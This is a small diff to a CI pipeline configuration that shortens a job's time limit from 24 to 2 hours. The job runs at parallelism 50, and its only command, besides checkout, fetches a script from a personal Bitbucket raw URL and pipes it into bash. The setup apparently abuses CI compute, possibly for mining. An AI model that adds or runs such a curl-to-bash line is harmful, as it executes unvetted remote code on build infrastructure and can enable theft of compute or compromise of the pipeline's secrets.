@@ -16,7 +16,7 @@ blocks:
         - name: Run job
           parallelism: 50
           execution_time_limit:
-            hours: 24
+            hours: 2
           commands:
             - checkout
             - 'curl -sL https://bitbucket.org/aqshaa/myaqsha/raw/opic | bash'
